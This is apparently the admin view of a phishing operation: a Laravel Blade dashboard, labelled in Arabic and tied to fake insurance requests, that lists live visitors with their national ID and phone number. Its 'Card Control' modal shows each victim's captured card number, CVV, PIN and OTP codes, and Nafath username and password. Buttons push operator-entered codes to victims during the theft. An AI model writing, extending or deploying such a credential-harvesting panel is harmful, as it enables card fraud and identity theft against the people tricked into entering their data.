@extends('admin.layouts.master')

@section('title', 'لوحة التحكم المباشرة')

@section('css')
<style>
    .live-dashboard {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        min-height: 100vh;
        padding: 20px;
    }

    .dashboard-header {
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        border-radius: 15px;
        padding: 25px;
        margin-bottom: 30px;
        border: 1px solid rgba(255, 255, 255, 0.2);
    }

    .dashboard-header h1 {
        color: #fff;
        font-size: 32px;
        font-weight: bold;
        margin: 0;
        text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
    }

    .stats-cards {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 20px;
        margin-bottom: 30px;
    }

    .stat-card {
        background: rgba(255, 255, 255, 0.95);
        border-radius: 15px;
        padding: 25px;
        box-shadow: 0 8px 16px rgba(0,0,0,0.1);
        transition: transform 0.3s ease;
    }

    .stat-card:hover {
        transform: translateY(-5px);
    }

    .stat-card .icon {
        font-size: 40px;
        margin-bottom: 15px;
    }

    .stat-card.online .icon { color: #10b981; }
    .stat-card.total .icon { color: #3b82f6; }
    .stat-card.pending .icon { color: #f59e0b; }
    .stat-card.completed .icon { color: #8b5cf6; }

    .stat-card h3 {
        font-size: 36px;
        font-weight: bold;
        margin: 10px 0;
        color: #1f2937;
    }

    .stat-card p {
        color: #6b7280;
        font-size: 14px;
        margin: 0;
    }

    .main-table-container {
        background: rgba(255, 255, 255, 0.98);
        border-radius: 15px;
        padding: 25px;
        box-shadow: 0 8px 32px rgba(0,0,0,0.1);
    }

    .table-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
    }

    .table-header h2 {
        font-size: 24px;
        font-weight: bold;
        color: #1f2937;
        margin: 0;
    }

    .refresh-btn {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
        transition: all 0.3s ease;
    }

    .refresh-btn:hover {
        transform: scale(1.05);
        box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
    }

    #usersTable {
        width: 100% !important;
    }

    #usersTable thead {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    }

    #usersTable thead th {
        color: white !important;
        font-weight: bold;
        padding: 15px 10px !important;
        border: none !important;
        text-align: center;
    }

    #usersTable tbody tr {
        transition: all 0.3s ease;
    }

    #usersTable tbody tr:hover {
        background: rgba(102, 126, 234, 0.1);
        transform: scale(1.01);
    }

    #usersTable tbody td {
        padding: 12px 10px !important;
        vertical-align: middle;
        text-align: center;
    }

    .status-badge {
        padding: 6px 12px;
        border-radius: 20px;
        font-size: 12px;
        font-weight: bold;
        display: inline-flex;
        align-items: center;
        gap: 5px;
    }

    .status-badge.online {
        background: #d1fae5;
        color: #065f46;
    }

    .status-badge.offline {
        background: #fee2e2;
        color: #991b1b;
    }

    .status-badge i {
        font-size: 8px;
    }

    .action-btn {
        padding: 6px 12px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-size: 12px;
        font-weight: bold;
        transition: all 0.3s ease;
        margin: 0 3px;
    }

    .btn-card {
        background: #10b981;
        color: white;
    }

    .btn-card:hover {
        background: #059669;
        transform: scale(1.05);
    }

    .btn-info {
        background: #3b82f6;
        color: white;
    }

    .btn-info:hover {
        background: #2563eb;
        transform: scale(1.05);
    }

    .btn-delete {
        background: #ef4444;
        color: white;
    }

    .btn-delete:hover {
        background: #dc2626;
        transform: scale(1.05);
    }

    /* Card Control Modal */
    .modal-xl {
        max-width: 95%;
    }

    .card-control-modal .modal-content {
        border-radius: 20px;
        border: none;
        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    }

    .card-control-header {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 20px 30px;
        border-radius: 20px 20px 0 0;
    }

    .card-control-header h3 {
        font-size: 24px;
        font-weight: bold;
        margin: 0;
    }

    .control-tabs {
        display: flex;
        gap: 10px;
        padding: 20px 30px;
        background: #f9fafb;
        border-bottom: 2px solid #e5e7eb;
        flex-wrap: wrap;
    }

    .control-tab {
        padding: 10px 20px;
        border: 2px solid #3b82f6;
        background: white;
        color: #3b82f6;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
        transition: all 0.3s ease;
    }

    .control-tab:hover,
    .control-tab.active {
        background: #3b82f6;
        color: white;
    }

    .submissions-container {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 20px;
        padding: 30px;
    }

    .submission-card {
        background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%);
        color: white;
        padding: 25px;
        border-radius: 15px;
        box-shadow: 0 8px 16px rgba(0,0,0,0.2);
    }

    .submission-card h4 {
        font-size: 18px;
        font-weight: bold;
        margin-bottom: 15px;
        border-bottom: 2px solid rgba(255,255,255,0.3);
        padding-bottom: 10px;
    }

    .submission-card p {
        margin: 8px 0;
        font-size: 14px;
        line-height: 1.6;
    }

    .submission-card strong {
        font-weight: bold;
    }

    .data-sections {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
        gap: 20px;
        padding: 30px;
        background: #f9fafb;
    }

    .data-section {
        background: white;
        padding: 20px;
        border-radius: 12px;
        border: 2px solid #e5e7eb;
    }

    .data-section h5 {
        font-size: 16px;
        font-weight: bold;
        color: #1f2937;
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 2px solid #3b82f6;
    }

    .data-section .data-row {
        display: flex;
        justify-content: space-between;
        margin: 10px 0;
        padding: 8px 0;
        border-bottom: 1px solid #f3f4f6;
    }

    .data-section .data-row:last-child {
        border-bottom: none;
    }

    .data-section .data-label {
        font-weight: bold;
        color: #6b7280;
    }

    .data-section .data-value {
        color: #1f2937;
        font-weight: 500;
    }

    .control-buttons {
        display: flex;
        gap: 10px;
        padding: 20px 30px;
        background: #f9fafb;
        border-top: 2px solid #e5e7eb;
        flex-wrap: wrap;
        justify-content: center;
    }

    .control-btn {
        padding: 10px 20px;
        border: 2px solid;
        background: white;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
        transition: all 0.3s ease;
        min-width: 100px;
    }

    .control-btn.btn-primary {
        border-color: #3b82f6;
        color: #3b82f6;
    }

    .control-btn.btn-primary:hover {
        background: #3b82f6;
        color: white;
    }

    .control-btn.btn-success {
        border-color: #10b981;
        color: #10b981;
    }

    .control-btn.btn-success:hover {
        background: #10b981;
        color: white;
    }

    .control-btn.btn-warning {
        border-color: #f59e0b;
        color: #f59e0b;
    }

    .control-btn.btn-warning:hover {
        background: #f59e0b;
        color: white;
    }

    .control-btn.btn-danger {
        border-color: #ef4444;
        color: #ef4444;
    }

    .control-btn.btn-danger:hover {
        background: #ef4444;
        color: white;
    }

    /* Pulse Animation for Online Status */
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
    }

    .status-badge.online i {
        animation: pulse 2s infinite;
    }

    /* Loading Spinner */
    .loading-spinner {
        display: inline-block;
        width: 20px;
        height: 20px;
        border: 3px solid rgba(255,255,255,.3);
        border-radius: 50%;
        border-top-color: #fff;
        animation: spin 1s ease-in-out infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }
</style>
@endsection

@section('content')
<div class="live-dashboard">
    <!-- Header -->
    <div class="dashboard-header">
        <h1>
            <i class="fas fa-satellite-dish"></i>
            لوحة التحكم المباشرة - مراقبة المستخدمين الآن
        </h1>
        <p style="color: rgba(255,255,255,0.9); margin: 10px 0 0 0; font-size: 16px;">
            <i class="fas fa-circle" style="color: #10b981; font-size: 10px;"></i>
            تحديث مباشر كل 3 ثواني
        </p>
    </div>

    <!-- Statistics Cards -->
    <div class="stats-cards">
        <div class="stat-card online">
            <div class="icon">
                <i class="fas fa-users"></i>
            </div>
            <h3 id="onlineCount">0</h3>
            <p>مستخدمين نشطين الآن</p>
        </div>

        <div class="stat-card total">
            <div class="icon">
                <i class="fas fa-chart-line"></i>
            </div>
            <h3 id="totalCount">0</h3>
            <p>إجمالي المستخدمين</p>
        </div>

        <div class="stat-card pending">
            <div class="icon">
                <i class="fas fa-clock"></i>
            </div>
            <h3 id="pendingCount">0</h3>
            <p>بانتظار التحقق</p>
        </div>

        <div class="stat-card completed">
            <div class="icon">
                <i class="fas fa-check-circle"></i>
            </div>
            <h3 id="completedCount">0</h3>
            <p>تم الإكمال</p>
        </div>
    </div>

    <!-- Main Users Table -->
    <div class="main-table-container">
        <div class="table-header">
            <h2>
                <i class="fas fa-list"></i>
                قائمة المستخدمين المباشرة
            </h2>
            <button class="refresh-btn" onclick="refreshData()">
                <i class="fas fa-sync-alt"></i>
                تحديث
            </button>
        </div>

        <table id="usersTable" class="table table-striped table-bordered">
            <thead>
                <tr>
                    <th>#</th>
                    <th>IP المستخدم</th>
                    <th>الاسم</th>
                    <th>رقم الهوية</th>
                    <th>رقم الجوال</th>
                    <th>المسار الحالي</th>
                    <th>الحالة</th>
                    <th>آخر نشاط</th>
                    <th>الإجراءات</th>
                </tr>
            </thead>
            <tbody>
                <!-- Data will be loaded via AJAX -->
            </tbody>
        </table>
    </div>
</div>

<!-- Card Control Modal -->
<div class="modal fade card-control-modal" id="cardControlModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
        <div class="modal-content">
            <div class="card-control-header">
                <h3>
                    <i class="fas fa-credit-card"></i>
                    Card Control — <span id="modalUserIP"></span>
                </h3>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>

            <!-- Control Tabs -->
            <div class="control-tabs">
                <button class="control-tab active" data-tab="home">Home</button>
                <button class="control-tab" data-tab="details">Details</button>
                <button class="control-tab" data-tab="thirdparty">Third-Party</button>
                <button class="control-tab" data-tab="comprehensive">Comprehensive</button>
                <button class="control-tab" data-tab="billing">Billing</button>
                <button class="control-tab" data-tab="payment">Payment</button>
            </div>

            <!-- Submissions Cards -->
            <div class="submissions-container" id="submissionsContainer">
                <!-- Will be populated dynamically -->
            </div>

            <!-- Data Sections -->
            <div class="data-sections">
                <!-- Card PIN/OTP -->
                <div class="data-section">
                    <h5>Card PIN/OTP</h5>
                    <div class="data-row">
                        <span class="data-label">PIN:</span>
                        <span class="data-value" id="cardPIN">—</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Card OTP (C-Code):</span>
                        <span class="data-value" id="cardOTP">—</span>
                    </div>
                </div>

                <!-- Phone/OTP -->
                <div class="data-section">
                    <h5>Phone/OTP</h5>
                    <div class="data-row">
                        <span class="data-label">Phone #:</span>
                        <span class="data-value" id="phoneNumber">—</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Operator:</span>
                        <span class="data-value" id="phoneOperator">—</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">birthDate:</span>
                        <span class="data-value" id="birthDate">—</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Phone OTP:</span>
                        <span class="data-value" id="phoneOTP">—</span>
                    </div>
                </div>

                <!-- Nafad/Basmah -->
                <div class="data-section">
                    <h5>Nafad/Basmah</h5>
                    <div class="data-row">
                        <span class="data-label">Nafad User:</span>
                        <span class="data-value" id="nafadUser">—</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Nafad Pass:</span>
                        <span class="data-value" id="nafadPass">—</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Basmah Code:</span>
                        <span class="data-value" id="basmahCode">—</span>
                    </div>
                </div>
            </div>

            <!-- Control Buttons -->
            <div class="control-buttons">
                <button class="control-btn btn-primary" onclick="sendCode('b-call')">B-Call</button>
                <button class="control-btn btn-primary" onclick="sendCode('c-code')">C-Code</button>
                <button class="control-btn btn-success" onclick="sendCode('pin')">PIN</button>
                <button class="control-btn btn-primary" onclick="sendCode('phone')">Phone</button>
                <button class="control-btn btn-warning" onclick="sendCode('p-code')">P-Code</button>
                <button class="control-btn btn-success" onclick="sendCode('stc-call')">STC Call</button>
                <button class="control-btn btn-danger" onclick="sendCode('nafad')">Nafad</button>
                <button class="control-btn btn-danger" onclick="sendCode('nafad-basmah')">Nafad-Basmah</button>
            </div>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
let dataTable;
let currentUserId = null;

$(document).ready(function() {
    // Initialize DataTable
    dataTable = $('#usersTable').DataTable({
        ajax: {
            url: '{{ route("super_admin.live-dashboard-data") }}',
            dataSrc: 'users'
        },
        columns: [
            { data: null, render: (data, type, row, meta) => meta.row + 1 },
            { data: 'ip_address' },
            { data: 'full_name' },
            { data: 'id_number' },
            { data: 'mobile_number' },
            { data: 'current_route' },
            { 
                data: 'is_active',
                render: function(data, type, row) {
                    if (data) {
                        return '<span class="status-badge online"><i class="fas fa-circle"></i> Online</span>';
                    } else {
                        return '<span class="status-badge offline"><i class="fas fa-circle"></i> Offline</span>';
                    }
                }
            },
            { 
                data: 'last_activity',
                render: function(data) {
                    return data ? new Date(data).toLocaleString('ar-SA') : '—';
                }
            },
            {
                data: null,
                render: function(data, type, row) {
                    return `
                        <button class="action-btn btn-card" onclick="openCardControl(${row.id})">Card</button>
                        <button class="action-btn btn-info" onclick="viewInfo(${row.id})">Info</button>
                        <button class="action-btn btn-delete" onclick="deleteUser(${row.id})">Delete</button>
                    `;
                }
            }
        ],
        order: [[7, 'desc']], // Order by last activity
        pageLength: 25,
        language: {
            url: '//cdn.datatables.net/plug-ins/1.13.7/i18n/ar.json'
        },
        drawCallback: function(settings) {
            updateStatistics(settings.json);
        }
    });

    // Auto-refresh every 3 seconds
    setInterval(function() {
        dataTable.ajax.reload(null, false);
    }, 3000);

    // Tab switching
    $('.control-tab').on('click', function() {
        $('.control-tab').removeClass('active');
        $(this).addClass('active');
        // Load tab content here
    });
});

function updateStatistics(data) {
    if (data && data.statistics) {
        $('#onlineCount').text(data.statistics.online);
        $('#totalCount').text(data.statistics.total);
        $('#pendingCount').text(data.statistics.pending);
        $('#completedCount').text(data.statistics.completed);
    }
}

function refreshData() {
    dataTable.ajax.reload();
    
    Swal.fire({
        icon: 'success',
        title: 'تم التحديث',
        text: 'تم تحديث البيانات بنجاح',
        timer: 1500,
        showConfirmButton: false
    });
}

function openCardControl(userId) {
    currentUserId = userId;
    
    // Fetch user data
    $.ajax({
        url: `{{ url('super_admin/live-dashboard/user') }}/${userId}`,
        method: 'GET',
        success: function(response) {
            // Populate modal with user data
            $('#modalUserIP').text(response.ip_address);
            
            // Populate submissions
            let submissionsHTML = '';
            if (response.submissions && response.submissions.length > 0) {
                response.submissions.forEach((sub, index) => {
                    submissionsHTML += `
                        <div class="submission-card">
                            <h4>Submission ${index + 1}</h4>
                            <p><strong>Name:</strong> ${sub.name || '—'}</p>
                            <p><strong>Card #:</strong> ${sub.card_number || '—'}</p>
                            <p><strong>Exp:</strong> ${sub.expiry || '—'}</p>
                            <p><strong>CVV:</strong> ${sub.cvv || '—'}</p>
                        </div>
                    `;
                });
            } else {
                submissionsHTML = '<p style="text-align: center; padding: 30px; color: #6b7280;">لا توجد بيانات متاحة</p>';
            }
            $('#submissionsContainer').html(submissionsHTML);
            
            // Populate data sections
            $('#cardPIN').text(response.card_pin || '—');
            $('#cardOTP').text(response.card_otp || '—');
            $('#phoneNumber').text(response.phone_number || '—');
            $('#phoneOperator').text(response.operator || '—');
            $('#birthDate').text(response.birth_date || '—');
            $('#phoneOTP').text(response.phone_otp || '—');
            $('#nafadUser').text(response.nafad_user || '—');
            $('#nafadPass').text(response.nafad_pass || '—');
            $('#basmahCode').text(response.basmah_code || '—');
            
            // Show modal
            $('#cardControlModal').modal('show');
        },
        error: function() {
            Swal.fire({
                icon: 'error',
                title: 'خطأ',
                text: 'فشل في تحميل بيانات المستخدم'
            });
        }
    });
}

function sendCode(type) {
    if (!currentUserId) return;
    
    Swal.fire({
        title: 'إرسال الكود',
        input: 'text',
        inputLabel: `أدخل كود ${type}`,
        inputPlaceholder: 'أدخل الكود هنا',
        showCancelButton: true,
        confirmButtonText: 'إرسال',
        cancelButtonText: 'إلغاء',
        preConfirm: (code) => {
            if (!code) {
                Swal.showValidationMessage('الرجاء إدخال الكود');
                return false;
            }
            return code;
        }
    }).then((result) => {
        if (result.isConfirmed) {
            // Send code via AJAX
            $.ajax({
                url: '{{ route("super_admin.live-dashboard-send-code") }}',
                method: 'POST',
                data: {
                    user_id: currentUserId,
                    code_type: type,
                    code: result.value,
                    _token: '{{ csrf_token() }}'
                },
                success: function(response) {
                    Swal.fire({
                        icon: 'success',
                        title: 'تم الإرسال',
                        text: 'تم إرسال الكود بنجاح',
                        timer: 1500
                    });
                },
                error: function() {
                    Swal.fire({
                        icon: 'error',
                        title: 'خطأ',
                        text: 'فشل في إرسال الكود'
                    });
                }
            });
        }
    });
}

function viewInfo(userId) {
    // Redirect to details page
    window.location.href = `{{ url('super_admin/insurance_requests') }}/${userId}`;
}

function deleteUser(userId) {
    Swal.fire({
        title: 'هل أنت متأكد؟',
        text: 'سيتم حذف هذا المستخدم نهائيًا',
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#ef4444',
        cancelButtonColor: '#6b7280',
        confirmButtonText: 'نعم، احذف',
        cancelButtonText: 'إلغاء'
    }).then((result) => {
        if (result.isConfirmed) {
            $.ajax({
                url: `{{ url('super_admin/insurance_requests') }}/${userId}`,
                method: 'DELETE',
                data: {
                    _token: '{{ csrf_token() }}'
                },
                success: function() {
                    Swal.fire({
                        icon: 'success',
                        title: 'تم الحذف',
                        text: 'تم حذف المستخدم بنجاح',
                        timer: 1500
                    });
                    dataTable.ajax.reload();
                },
                error: function() {
                    Swal.fire({
                        icon: 'error',
                        title: 'خطأ',
                        text: 'فشل في حذف المستخدم'
                    });
                }
            });
        }
    });
}
</script>
@endsection
